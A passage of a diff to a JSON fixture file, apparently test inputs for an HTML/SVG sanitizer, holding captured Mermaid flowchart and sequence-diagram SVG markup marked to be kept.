markerHeight=\"8\" orient=\"auto\"><path d=\"M 0 5 L 10 10 L 10 0 z\" class=\"arrowMarkerPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></path></marker><marker id=\"mmA_flowchart-v2-pointEnd-margin\" class=\"marker flowchart-v2\" viewBox=\"0 0 11.5 14\" refX=\"11.5\" refY=\"7\" markerUnits=\"userSpaceOnUse\" markerWidth=\"10.5\" markerHeight=\"14\" orient=\"auto\"><path d=\"M 0 0 L 11.5 7 L 0 14 z\" class=\"arrowMarkerPath\" style=\"stroke-width: 0; stroke-dasharray: 1, 0;\"></path></marker><marker id=\"mmA_flowchart-v2-pointStart-margin\" class=\"marker flowchart-v2\" viewBox=\"0 0 11.5 14\" refX=\"1\" refY=\"7\" markerUnits=\"userSpaceOnUse\" markerWidth=\"11.5\" markerHeight=\"14\" orient=\"auto\"><polygon points=\"0,7 11.5,14 11.5,0\" class=\"arrowMarkerPath\" style=\"stroke-width: 0; stroke-dasharray: 1, 0;\"></polygon></marker><marker id=\"mmA_flowchart-v2-circleEnd\" class=\"marker flowchart-v2\" viewBox=\"0 0 10 10\" refX=\"11\" refY=\"5\" markerUnits=\"userSpaceOnUse\" markerWidth=\"11\" markerHeight=\"11\" orient=\"auto\"><circle cx=\"5\" cy=\"5\" r=\"5\" class=\"arrowMarkerPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></circle></marker><marker id=\"mmA_flowchart-v2-circleStart\" class=\"marker flowchart-v2\" viewBox=\"0 0 10 10\" refX=\"-1\" refY=\"5\" markerUnits=\"userSpaceOnUse\" markerWidth=\"11\" markerHeight=\"11\" orient=\"auto\"><circle cx=\"5\" cy=\"5\" r=\"5\" class=\"arrowMarkerPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></circle></marker><marker id=\"mmA_flowchart-v2-circleEnd-margin\" class=\"marker flowchart-v2\" viewBox=\"0 0 10 10\" refY=\"5\" refX=\"12.25\" markerUnits=\"userSpaceOnUse\" markerWidth=\"14\" markerHeight=\"14\" orient=\"auto\"><circle cx=\"5\" cy=\"5\" r=\"5\" class=\"arrowMarkerPath\" style=\"stroke-width: 0; stroke-dasharray: 1, 0;\"></circle></marker><marker id=\"mmA_flowchart-v2-circleStart-margin\" class=\"marker flowchart-v2\" viewBox=\"0 0 10 10\" refX=\"-2\" refY=\"5\" markerUnits=\"userSpaceOnUse\" markerWidth=\"14\" markerHeight=\"14\" orient=\"auto\"><circle cx=\"5\" cy=\"5\" r=\"5\" class=\"arrowMarkerPath\" style=\"stroke-width: 0; stroke-dasharray: 1, 0;\"></circle></marker><marker id=\"mmA_flowchart-v2-crossEnd\" class=\"marker cross flowchart-v2\" viewBox=\"0 0 11 11\" refX=\"12\" refY=\"5.2\" markerUnits=\"userSpaceOnUse\" markerWidth=\"11\" markerHeight=\"11\" orient=\"auto\"><path d=\"M 1,1 l 9,9 M 10,1 l -9,9\" class=\"arrowMarkerPath\" style=\"stroke-width: 2; stroke-dasharray: 1, 0;\"></path></marker><marker id=\"mmA_flowchart-v2-crossStart\" class=\"marker cross flowchart-v2\" viewBox=\"0 0 11 11\" refX=\"-1\" refY=\"5.2\" markerUnits=\"userSpaceOnUse\" markerWidth=\"11\" markerHeight=\"11\" orient=\"auto\"><path d=\"M 1,1 l 9,9 M 10,1 l -9,9\" class=\"arrowMarkerPath\" style=\"stroke-width: 2; stroke-dasharray: 1, 0;\"></path></marker><marker id=\"mmA_flowchart-v2-crossEnd-margin\" class=\"marker cross flowchart-v2\" viewBox=\"0 0 15 15\" refX=\"17.7\" refY=\"7.5\" markerUnits=\"userSpaceOnUse\" markerWidth=\"12\" markerHeight=\"12\" orient=\"auto\"><path d=\"M 1,1 L 14,14 M 1,14 L 14,1\" class=\"arrowMarkerPath\" style=\"stroke-width: 2.5;\"></path></marker><marker id=\"mmA_flowchart-v2-crossStart-margin\" class=\"marker cross flowchart-v2\" viewBox=\"0 0 15 15\" refX=\"-3.5\" refY=\"7.5\" markerUnits=\"userSpaceOnUse\" markerWidth=\"12\" markerHeight=\"12\" orient=\"auto\"><path d=\"M 1,1 L 14,14 M 1,14 L 14,1\" class=\"arrowMarkerPath\" style=\"stroke-width: 2.5; stroke-dasharray: 1, 0;\"></path></marker><g class=\"root\"><g class=\"clusters\"></g><g class=\"edgePaths\"><path d=\"M103.016,47.151L108.626,46.045C114.237,44.939,125.458,42.727,137.343,42.843C149.228,42.959,161.776,45.402,168.05,46.623L174.324,47.845\" id=\"mmA-L_A_B_0\" class=\"edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link\" style=\";\" data-edge=\"true\" data-et=\"edge\" data-id=\"L_A_B_0\" data-points=\"W3sieCI6MTAzLjAxNTYyNSwieSI6NDcuMTUxMjM2MTY0NTgxMzN9LHsieCI6MTM2LjY3OTY4NzUsInkiOjQwLjUxNTYyNX0seyJ4IjoxNzguMjUwMTcxNTgwMzI5NDQsInkiOjQ4LjYwOTIwMzQxOTY3MDU2NH1d\" data-look=\"classic\" marker-end=\"url(#mmA_flowchart-v2-pointEnd)\"></path><path d=\"M267.375,56.516L273.466,56.516C279.557,56.516,291.74,56.516,303.255,56.516C314.771,56.516,325.62,56.516,331.044,56.516L336.469,56.516\" id=\"mmA-L_B_C_0\" class=\"edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link\" style=\";\" data-edge=\"true\" data-et=\"edge\" data-id=\"L_B_C_0\" data-points=\"W3sieCI6MjY3LjM3NSwieSI6NTYuNTE1NjI1fSx7IngiOjMwMy45MjE4NzUsInkiOjU2LjUxNTYyNX0seyJ4IjozNDAuNDY4NzUsInkiOjU2LjUxNTYyNX1d\" data-look=\"classic\" marker-end=\"url(#mmA_flowchart-v2-pointEnd)\"></path><path d=\"M178.25,64.422L171.322,65.771C164.393,67.12,150.537,69.818,138.652,70.19C126.766,70.562,116.853,68.608,111.897,67.631L106.94,66.654\" id=\"mmA-L_B_A_0\" class=\"edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link\" style=\";\" data-edge=\"true\" data-et=\"edge\" data-id=\"L_B_A_0\" data-points=\"W3sieCI6MTc4LjI1MDE3MTU4MDMyOTQ0LCJ5Ijo2NC40MjIwNDY1ODAzMjk0NH0seyJ4IjoxMzYuNjc5Njg3NSwieSI6NzIuNTE1NjI1fSx7IngiOjEwMy4wMTU2MjUsInkiOjY1Ljg4MDAxMzgzNTQxODY3fV0=\" data-look=\"classic\" marker-end=\"url(#mmA_flowchart-v2-pointEnd)\"></path></g><g class=\"edgeLabels\"><g class=\"edgeLabel\"><g class=\"label\" data-id=\"L_A_B_0\" transform=\"translate(0, 0)\"><foreignObject width=\"0\" height=\"0\"><div xmlns=\"http://www.w3.org/1999/xhtml\" class=\"labelBkg\" style=\"display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;\"><span class=\"edgeLabel\"></span></div></foreignObject></g></g><g class=\"edgeLabel\" transform=\"translate(303.921875, 56.515625)\"><g class=\"label\" data-id=\"L_B_C_0\" transform=\"translate(-11.546875, -12)\"><foreignObject width=\"23.09375\" height=\"24\"><div xmlns=\"http://www.w3.org/1999/xhtml\" class=\"labelBkg\" style=\"display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;\"><span class=\"edgeLabel\"><p>yes</p></span></div></foreignObject></g></g><g class=\"edgeLabel\" transform=\"translate(140.62522, 71.74745)\"><g class=\"label\" data-id=\"L_B_A_0\" transform=\"translate(-8.6640625, -12)\"><foreignObject width=\"17.328125\" height=\"24\"><div xmlns=\"http://www.w3.org/1999/xhtml\" class=\"labelBkg\" style=\"display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;\"><span class=\"edgeLabel\"><p>no</p></span></div></foreignObject></g></g></g><g class=\"nodes\"><g class=\"node default\" id=\"mmA-flowchart-A-0\" data-look=\"classic\" transform=\"translate(55.5078125, 56.515625)\"><rect class=\"basic label-container\" style=\"\" x=\"-47.5078125\" y=\"-27\" width=\"95.015625\" height=\"54\"></rect><g class=\"label\" style=\"\" transform=\"translate(-17.5078125, -12)\"><rect></rect><foreignObject width=\"35.015625\" height=\"24\"><div xmlns=\"http://www.w3.org/1999/xhtml\" style=\"display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;\"><span class=\"nodeLabel\"><p>Start</p></span></div></foreignObject></g></g><g class=\"node default\" id=\"mmA-flowchart-B-1\" data-look=\"classic\" transform=\"translate(218.859375, 56.515625)\"><polygon points=\"48.515625,0 97.03125,-48.515625 48.515625,-97.03125 0,-48.515625\" class=\"label-container\" transform=\"translate(-48.015625, 48.515625)\"></polygon><g class=\"label\" style=\"\" transform=\"translate(-21.515625, -12)\"><rect></rect><foreignObject width=\"43.03125\" height=\"24\"><div xmlns=\"http://www.w3.org/1999/xhtml\" style=\"display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;\"><span class=\"nodeLabel\"><p>Check</p></span></div></foreignObject></g></g><g class=\"node default\" id=\"mmA-flowchart-C-3\" data-look=\"classic\" transform=\"translate(388.40625, 56.515625)\"><rect class=\"basic label-container\" style=\"fill:#f9f !important;stroke:#333 !important\" x=\"-47.9375\" y=\"-27\" width=\"95.875\" height=\"54\"></rect><g class=\"label\" style=\"\" transform=\"translate(-17.9375, -12)\"><rect></rect><foreignObject width=\"35.875\" height=\"24\"><div xmlns=\"http://www.w3.org/1999/xhtml\" style=\"display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;\"><span class=\"nodeLabel\"><p>Done</p></span></div></foreignObject></g></g></g></g></g><defs><filter id=\"mmA-drop-shadow\" height=\"130%\" width=\"130%\"><feDropShadow dx=\"4\" dy=\"4\" stdDeviation=\"0\" flood-opacity=\"0.06\" flood-color=\"#000000\"></feDropShadow></filter></defs><defs><filter id=\"mmA-drop-shadow-small\" height=\"150%\" width=\"150%\"><feDropShadow dx=\"2\" dy=\"2\" stdDeviation=\"0\" flood-opacity=\"0.06\" flood-color=\"#000000\"></feDropShadow></filter></defs></svg>",
+  "note": "real output; carries xmlns / xmlns:xhtml http:// values, url(#...) marker references and, for the flowchart, <foreignObject> labels"
+ },
+ {
+  "name": "keep: mermaid sequence (Mermaid 11.16.1, captured in Chrome, securityLevel strict)",
+  "kind": "keep",
+  "html": "<svg id=\"mmB\" width=\"100%\" xmlns=\"http://www.w3.org/2000/svg\" style=\"max-width: 450px;\" viewBox=\"-50 -10 450 263\" role=\"graphics-document document\" aria-roledescription=\"sequence\"><g><rect x=\"200\" y=\"177\" fill=\"#eaeaea\" stroke=\"#666\" width=\"150\" height=\"65\" name=\"Bob\" rx=\"3\" ry=\"3\" class=\"actor actor-bottom\"></rect><text x=\"275\" y=\"209.5\" dominant-baseline=\"central\" alignment-baseline=\"central\" class=\"actor actor-box\" style=\"text-anchor: middle; font-size: 16px; font-weight: 400;\"><tspan x=\"275\" dy=\"0\">Bob</tspan></text></g><g><rect x=\"0\" y=\"177\" fill=\"#eaeaea\" stroke=\"#666\" width=\"150\" height=\"65\" name=\"Alice\" rx=\"3\" ry=\"3\" class=\"actor actor-bottom\"></rect><text x=\"75\" y=\"209.5\" dominant-baseline=\"central\" alignment-baseline=\"central\" class=\"actor actor-box\" style=\"text-anchor: middle; font-size: 16px; font-weight: 400;\"><tspan x=\"75\" dy=\"0\">Alice</tspan></text></g><g><line id=\"actor1\" x1=\"275\" y1=\"65\" x2=\"275\" y2=\"177\" class=\"actor-line 200\" stroke-width=\"0.5px\" stroke=\"#999\" name=\"Bob\" data-et=\"life-line\" data-id=\"Bob\"></line><g id=\"root-1\" data-et=\"participant\" data-type=\"participant\" data-id=\"Bob\"><rect x=\"200\" y=\"0\" fill=\"#eaeaea\" stroke=\"#666\" width=\"150\" height=\"65\" name=\"Bob\" rx=\"3\" ry=\"3\" class=\"actor actor-top\"></rect><text x=\"275\" y=\"32.5\" dominant-baseline=\"central\" alignment-baseline=\"central\" class=\"actor actor-box\" style=\"text-anchor: middle; font-size: 16px; font-weight: 400;\"><tspan x=\"275\" dy=\"0\">Bob</tspan></text></g></g><g><line id=\"actor0\" x1=\"75\" y1=\"65\" x2=\"75\" y2=\"177\" class=\"actor-line 200\" stroke-width=\"0.5px\" stroke=\"#999\" name=\"Alice\" data-et=\"life-line\" data-id=\"Alice\"></line><g id=\"root-0\" data-et=\"participant\" data-type=\"participant\" data-id=\"Alice\"><rect x=\"0\" y=\"0\" fill=\"#eaeaea\" stroke=\"#666\" width=\"150\" height=\"65\" name=\"Alice\" rx=\"3\" ry=\"3\" class=\"actor actor-top\"></rect><text x=\"75\" y=\"32.5\" dominant-baseline=\"central\" alignment-baseline=\"central\" class=\"actor actor-box\" style=\"text-anchor: middle; font-size: 16px; font-weight: 400;\"><tspan x=\"75\" dy=\"0\">Alice</tspan></text></g></g><style>#mmB{font-family:\"trebuchet ms\",verdana,arial,sans-serif;font-size:16px;fill:#333;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#mmB .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#mmB .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#mmB .error-icon{fill:#552222;}#mmB .error-text{fill:#552222;stroke:#552222;}#mmB .edge-thickness-normal{stroke-width:1px;}#mmB .edge-thickness-thick{stroke-width:3.5px;}#mmB .edge-pattern-solid{stroke-dasharray:0;}#mmB .edge-thickness-invisible{stroke-width:0;fill:none;}#mmB .edge-pattern-dashed{stroke-dasharray:3;}#mmB .edge-pattern-dotted{stroke-dasharray:2;}#mmB .marker{fill:#333333;stroke:#333333;}#mmB .marker.cross{stroke:#333333;}#mmB svg{font-family:\"trebuchet ms\",verdana,arial,sans-serif;font-size:16px;}#mmB p{margin:0;}#mmB .actor{stroke:#9370DB;fill:#ECECFF;stroke-width:1;}#mmB rect.actor.outer-path[data-look=\"neo\"]{filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmB rect.note[data-look=\"neo\"]{stroke:#aaaa33;fill:#fff5ad;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmB text.actor&gt;tspan{fill:black;stroke:none;}#mmB .actor-line{stroke:#9370DB;}#mmB .innerArc{stroke-width:1.5;stroke-dasharray:none;}#mmB .messageLine0{stroke-width:1.5;stroke-dasharray:none;stroke:#333;}#mmB .messageLine1{stroke-width:1.5;stroke-dasharray:2,2;stroke:#333;}#mmB [id$=\"-arrowhead\"] path{fill:#333;stroke:#333;}#mmB .sequenceNumber{fill:white;}#mmB [id$=\"-sequencenumber\"]{fill:#333;}#mmB [id$=\"-crosshead\"] path{fill:#333;stroke:#333;}#mmB .messageText{fill:#333;stroke:none;}#mmB .labelBox{stroke:#9370DB;fill:#ECECFF;filter:none;}#mmB .labelText,#mmB .labelText&gt;tspan{fill:black;stroke:none;}#mmB .loopText,#mmB .loopText&gt;tspan{fill:black;stroke:none;}#mmB .sectionTitle,#mmB .sectionTitle&gt;tspan{fill:black;stroke:none;}#mmB .loopLine{stroke-width:2px;stroke-dasharray:2,2;stroke:#9370DB;fill:#9370DB;}#mmB .note{stroke:#aaaa33;fill:#fff5ad;}#mmB .noteText,#mmB .noteText&gt;tspan{fill:black;stroke:none;font-weight:normal;}#mmB .activation0{fill:#f4f4f4;stroke:#666;}#mmB .activation1{fill:#f4f4f4;stroke:#666;}#mmB .activation2{fill:#f4f4f4;stroke:#666;}#mmB .actorPopupMenu{position:absolute;}#mmB .actorPopupMenuPanel{position:absolute;fill:#ECECFF;box-shadow:0px 8px 16px 0px rgba(0,0,0,0.2);filter:drop-shadow(3px 5px 2px rgb(0 0 0 / 0.4));}#mmB .actor-man circle,#mmB line{fill:#ECECFF;stroke-width:2px;}#mmB g rect.rect{filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));stroke:#9370DB;}#mmB .node .neo-node{stroke:#9370DB;}#mmB [data-look=\"neo\"].node rect,#mmB [data-look=\"neo\"].cluster rect,#mmB [data-look=\"neo\"].node polygon{stroke:#9370DB;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmB [data-look=\"neo\"].swimlane.cluster rect{filter:none;}#mmB [data-look=\"neo\"].node path{stroke:#9370DB;stroke-width:1px;}#mmB [data-look=\"neo\"].node .outer-path{filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmB [data-look=\"neo\"].node .neo-line path{stroke:#9370DB;filter:none;}#mmB [data-look=\"neo\"].node circle{stroke:#9370DB;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmB [data-look=\"neo\"].node circle .state-start{fill:#000000;}#mmB [data-look=\"neo\"].icon-shape .icon{fill:#9370DB;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmB [data-look=\"neo\"].icon-shape .icon-neo path{stroke:#9370DB;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmB :root{--mermaid-font-family:\"trebuchet ms\",verdana,arial,sans-serif;}</style><g></g><defs><symbol id=\"mmB-computer\" width=\"24\" height=\"24\"><path transform=\"scale(.5)\" d=\"M2 2v13h20v-13h-20zm18 11h-16v-9h16v9zm-10.228 6l.466-1h3.524l.467 1h-4.457zm14.228 3h-24l2-6h2.104l-1.33 4h18.45l-1.297-4h2.073l2 6zm-5-10h-14v-7h14v7z\"></path></symbol></defs><defs><symbol id=\"mmB-database\" fill-rule=\"evenodd\" clip-rule=\"evenodd\"><path transform=\"scale(.5)\" d=\"M12.258.001l.256.004.255.005.253.008.251.01.249.012.247.015.246.016.242.019.241.02.239.023.236.024.233.027.231.028.229.031.225.032.223.034.22.036.217.038.214.04.211.041.208.043.205.045.201.046.198.048.194.05.191.051.187.053.183.054.18.056.175.057.172.059.168.06.163.061.16.063.155.064.15.066.074.033.073.033.071.034.07.034.069.035.068.035.067.035.066.035.064.036.064.036.062.036.06.036.06.037.058.037.058.037.055.038.055.038.053.038.052.038.051.039.05.039.048.039.047.039.045.04.044.04.043.04.041.04.04.041.039.041.037.041.036.041.034.041.033.042.032.042.03.042.029.042.027.042.026.043.024.043.023.043.021.043.02.043.018.044.017.043.015.044.013.044.012.044.011.045.009.044.007.045.006.045.004.045.002.045.001.045v17l-.001.045-.002.045-.004.045-.006.045-.007.045-.009.044-.011.045-.012.044-.013.044-.015.044-.017.043-.018.044-.02.043-.021.043-.023.043-.024.043-.026.043-.027.042-.029.042-.03.042-.032.042-.033.042-.034.041-.036.041-.037.041-.039.041-.04.041-.041.04-.043.04-.044.04-.045.04-.047.039-.048.039-.05.039-.051.039-.052.038-.053.038-.055.038-.055.038-.058.037-.058.037-.06.037-.06.036-.062.036-.064.036-.064.036-.066.035-.067.035-.068.035-.069.035-.07.034-.071.034-.073.033-.074.033-.15.066-.155.064-.16.063-.163.061-.168.06-.172.059-.175.057-.18.056-.183.054-.187.053-.191.051-.194.05-.198.048-.201.046-.205.045-.208.043-.211.041-.214.04-.217.038-.22.036-.223.034-.225.032-.229.031-.231.028-.233.027-.236.024-.239.023-.241.02-.242.019-.246.016-.247.015-.249.012-.251.01-.253.008-.255.005-.256.004-.258.001-.258-.001-.256-.004-.255-.005-.253-.008-.251-.01-.249-.012-.247-.015-.245-.016-.243-.019-.241-.02-.238-.023-.236-.024-.234-.027-.231-.028-.228-.031-.226-.032-.223-.034-.22-.036-.217-.038-.214-.04-.211-.041-.208-.043-.204-.045-.201-.046-.198-.048-.195-.05-.19-.051-.187-.053-.184-.054-.179-.056-.176-.057-.172-.059-.167-.06-.164-.061-.159-.063-.155-.064-.151-.066-.074-.033-.072-.033-.072-.034-.07-.034-.069-.035-.068-.035-.067-.035-.066-.035-.064-.036-.063-.036-.062-.036-.061-.036-.06-.037-.058-.037-.057-.037-.056-.038-.055-.038-.053-.038-.052-.038-.051-.039-.049-.039-.049-.039-.046-.039-.046-.04-.044-.04-.043-.04-.041-.04-.04-.041-.039-.041-.037-.041-.036-.041-.034-.041-.033-.042-.032-.042-.03-.042-.029-.042-.027-.042-.026-.043-.024-.043-.023-.043-.021-.043-.02-.043-.018-.044-.017-.043-.015-.044-.013-.044-.012-.044-.011-.045-.009-.044-.007-.045-.006-.045-.004-.045-.002-.045-.001-.045v-17l.001-.045.002-.045.004-.045.006-.045.007-.045.009-.044.011-.045.012-.044.013-.044.015-.044.017-.043.018-.044.02-.043.021-.043.023-.043.024-.043.026-.043.027-.042.029-.042.03-.042.032-.042.033-.042.034-.041.036-.041.037-.041.039-.041.04-.041.041-.04.043-.04.044-.04.046-.04.046-.039.049-.039.049-.039.051-.039.052-.038.053-.038.055-.038.056-.038.057-.037.058-.037.06-.037.061-.036.062-.036.063-.036.064-.036.066-.035.067-.035.068-.035.069-.035.07-.034.072-.034.072-.033.074-.033.151-.066.155-.064.159-.063.164-.061.167-.06.172-.059.176-.057.179-.056.184-.054.187-.053.19-.051.195-.05.198-.048.201-.046.204-.045.208-.043.211-.041.214-.04.217-.038.22-.036.223-.034.226-.032.228-.031.231-.028.234-.027.236-.024.238-.023.241-.02.243-.019.245-.016.247-.015.249-.012.251-.01.253-.008.255-.005.256-.004.258-.001.258.001zm-9.258 20.499v.01l.001.021.003.021.004.022.005.021.006.022.007.022.009.023.01.022.011.023.012.023.013.023.015.023.016.024.017.023.018.024.019.024.021.024.022.025.023.024.024.025.052.049.056.05.061.051.066.051.07.051.075.051.079.052.084.052.088.052.092.052.097.052.102.051.105.052.11.052.114.051.119.051.123.051.127.05.131.05.135.05.139.048.144.049.147.047.152.047.155.047.16.045.163.045.167.043.171.043.176.041.178.041.183.039.187.039.19.037.194.035.197.035.202.033.204.031.209.03.212.029.216.027.219.025.222.024.226.021.23.02.233.018.236.016.24.015.243.012.246.01.249.008.253.005.256.004.259.001.26-.001.257-.004.254-.005.25-.008.247-.011.244-.012.241-.014.237-.016.233-.018.231-.021.226-.021.224-.024.22-.026.216-.027.212-.028.21-.031.205-.031.202-.034.198-.034.194-.036.191-.037.187-.039.183-.04.179-.04.175-.042.172-.043.168-.044.163-.045.16-.046.155-.046.152-.047.148-.048.143-.049.139-.049.136-.05.131-.05.126-.05.123-.051.118-.052.114-.051.11-.052.106-.052.101-.052.096-.052.092-.052.088-.053.083-.051.079-.052.074-.052.07-.051.065-.051.06-.051.056-.05.051-.05.023-.024.023-.025.021-.024.02-.024.019-.024.018-.024.017-.024.015-.023.014-.024.013-.023.012-.023.01-.023.01-.022.008-.022.006-.022.006-.022.004-.022.004-.021.001-.021.001-.021v-4.127l-.077.055-.08.053-.083.054-.085.053-.087.052-.09.052-.093.051-.095.05-.097.05-.1.049-.102.049-.105.048-.106.047-.109.047-.111.046-.114.045-.115.045-.118.044-.12.043-.122.042-.124.042-.126.041-.128.04-.13.04-.132.038-.134.038-.135.037-.138.037-.139.035-.142.035-.143.034-.144.033-.147.032-.148.031-.15.03-.151.03-.153.029-.154.027-.156.027-.158.026-.159.025-.161.024-.162.023-.163.022-.165.021-.166.02-.167.019-.169.018-.169.017-.171.016-.173.015-.173.014-.175.013-.175.012-.177.011-.178.01-.179.008-.179.008-.181.006-.182.005-.182.004-.184.003-.184.002h-.37l-.184-.002-.184-.003-.182-.004-.182-.005-.181-.006-.179-.008-.179-.008-.178-.01-.176-.011-.176-.012-.175-.013-.173-.014-.172-.015-.171-.016-.17-.017-.169-.018-.167-.019-.166-.02-.165-.021-.163-.022-.162-.023-.161-.024-.159-.025-.157-.026-.156-.027-.155-.027-.153-.029-.151-.03-.15-.03-.148-.031-.146-.032-.145-.033-.143-.034-.141-.035-.14-.035-.137-.037-.136-.037-.134-.038-.132-.038-.13-.04-.128-.04-.126-.041-.124-.042-.122-.042-.12-.044-.117-.043-.116-.045-.113-.045-.112-.046-.109-.047-.106-.047-.105-.048-.102-.049-.1-.049-.097-.05-.095-.05-.093-.052-.09-.051-.087-.052-.085-.053-.083-.054-.08-.054-.077-.054v4.127zm0-5.654v.011l.001.021.003.021.004.021.005.022.006.022.007.022.009.022.01.022.011.023.012.023.013.023.015.024.016.023.017.024.018.024.019.024.021.024.022.024.023.025.024.024.052.05.056.05.061.05.066.051.07.051.075.052.079.051.084.052.088.052.092.052.097.052.102.052.105.052.11.051.114.051.119.052.123.05.127.051.131.05.135.049.139.049.144.048.147.048.152.047.155.046.16.045.163.045.167.044.171.042.176.042.178.04.183.04.187.038.19.037.194.036.197.034.202.033.204.032.209.03.212.028.216.027.219.025.222.024.226.022.23.02.233.018.236.016.24.014.243.012.246.01.249.008.253.006.256.003.259.001.26-.001.257-.003.254-.006.25-.008.247-.01.244-.012.241-.015.237-.016.233-.018.231-.02.226-.022.224-.024.22-.025.216-.027.212-.029.21-.03.205-.032.202-.033.198-.035.194-.036.191-.037.187-.039.183-.039.179-.041.175-.042.172-.043.168-.044.163-.045.16-.045.155-.047.152-.047.148-.048.143-.048.139-.05.136-.049.131-.05.126-.051.123-.051.118-.051.114-.052.11-.052.106-.052.101-.052.096-.052.092-.052.088-.052.083-.052.079-.052.074-.051.07-.052.065-.051.06-.05.056-.051.051-.049.023-.025.023-.024.021-.025.02-.024.019-.024.018-.024.017-.024.015-.023.014-.023.013-.024.012-.022.01-.023.01-.023.008-.022.006-.022.006-.022.004-.021.004-.022.001-.021.001-.021v-4.139l-.077.054-.08.054-.083.054-.085.052-.087.053-.09.051-.093.051-.095.051-.097.05-.1.049-.102.049-.105.048-.106.047-.109.047-.111.046-.114.045-.115.044-.118.044-.12.044-.122.042-.124.042-.126.041-.128.04-.13.039-.132.039-.134.038-.135.037-.138.036-.139.036-.142.035-.143.033-.144.033-.147.033-.148.031-.15.03-.151.03-.153.028-.154.028-.156.027-.158.026-.159.025-.161.024-.162.023-.163.022-.165.021-.166.02-.167.019-.169.018-.169.017-.171.016-.173.015-.173.014-.175.013-.175.012-.177.011-.178.009-.179.009-.179.007-.181.007-.182.005-.182.004-.184.003-.184.002h-.37l-.184-.002-.184-.003-.182-.004-.182-.005-.181-.007-.179-.007-.179-.009-.178-.009-.176-.011-.176-.012-.175-.013-.173-.014-.172-.015-.171-.016-.17-.017-.169-.018-.167-.019-.166-.02-.165-.021-.163-.022-.162-.023-.161-.024-.159-.025-.157-.026-.156-.027-.155-.028-.153-.028-.151-.03-.15-.03-.148-.031-.146-.033-.145-.033-.143-.033-.141-.035-.14-.036-.137-.036-.136-.037-.134-.038-.132-.039-.13-.039-.128-.04-.126-.041-.124-.042-.122-.043-.12-.043-.117-.044-.116-.044-.113-.046-.112-.046-.109-.046-.106-.047-.105-.048-.102-.049-.1-.049-.097-.05-.095-.051-.093-.051-.09-.051-.087-.053-.085-.052-.083-.054-.08-.054-.077-.054v4.139zm0-5.666v.011l.001.02.003.022.004.021.005.022.006.021.007.022.009.023.01.022.011.023.012.023.013.023.015.023.016.024.017.024.018.023.019.024.021.025.022.024.023.024.024.025.052.05.056.05.061.05.066.051.07.051.075.052.079.051.084.052.088.052.092.052.097.052.102.052.105.051.11.052.114.051.119.051.123.051.127.05.131.05.135.05.139.049.144.048.147.048.152.047.155.046.16.045.163.045.167.043.171.043.176.042.178.04.183.04.187.038.19.037.194.036.197.034.202.033.204.032.209.03.212.028.216.027.219.025.222.024.226.021.23.02.233.018.236.017.24.014.243.012.246.01.249.008.253.006.256.003.259.001.26-.001.257-.003.254-.006.25-.008.247-.01.244-.013.241-.014.237-.016.233-.018.231-.02.226-.022.224-.024.22-.025.216-.027.212-.029.21-.03.205-.032.202-.033.198-.035.194-.036.191-.037.187-.039.183-.039.179-.041.175-.042.172-.043.168-.044.163-.045.16-.045.155-.047.152-.047.148-.048.143-.049.139-.049.136-.049.131-.051.126-.05.123-.051.118-.052.114-.051.11-.052.106-.052.101-.052.096-.052.092-.052.088-.052.083-.052.079-.052.074-.052.07-.051.065-.051.06-.051.056-.05.051-.049.023-.025.023-.025.021-.024.02-.024.019-.024.018-.024.017-.024.015-.023.014-.024.013-.023.012-.023.01-.022.01-.023.008-.022.006-.022.006-.022.004-.022.004-.021.001-.021.001-.021v-4.153l-.077.054-.08.054-.083.053-.085.053-.087.053-.09.051-.093.051-.095.051-.097.05-.1.049-.102.048-.105.048-.106.048-.109.046-.111.046-.114.046-.115.044-.118.044-.12.043-.122.043-.124.042-.126.041-.128.04-.13.039-.132.039-.134.038-.135.037-.138.036-.139.036-.142.034-.143.034-.144.033-.147.032-.148.032-.15.03-.151.03-.153.028-.154.028-.156.027-.158.026-.159.024-.161.024-.162.023-.163.023-.165.021-.166.02-.167.019-.169.018-.169.017-.171.016-.173.015-.173.014-.175.013-.175.012-.177.01-.178.01-.179.009-.179.007-.181.006-.182.006-.182.004-.184.003-.184.001-.185.001-.185-.001-.184-.001-.184-.003-.182-.004-.182-.006-.181-.006-.179-.007-.179-.009-.178-.01-.176-.01-.176-.012-.175-.013-.173-.014-.172-.015-.171-.016-.17-.017-.169-.018-.167-.019-.166-.02-.165-.021-.163-.023-.162-.023-.161-.024-.159-.024-.157-.026-.156-.027-.155-.028-.153-.028-.151-.03-.15-.03-.148-.032-.146-.032-.145-.033-.143-.034-.141-.034-.14-.036-.137-.036-.136-.037-.134-.038-.132-.039-.13-.039-.128-.041-.126-.041-.124-.041-.122-.043-.12-.043-.117-.044-.116-.044-.113-.046-.112-.046-.109-.046-.106-.048-.105-.048-.102-.048-.1-.05-.097-.049-.095-.051-.093-.051-.09-.052-.087-.052-.085-.053-.083-.053-.08-.054-.077-.054v4.153zm8.74-8.179l-.257.004-.254.005-.25.008-.247.011-.244.012-.241.014-.237.016-.233.018-.231.021-.226.022-.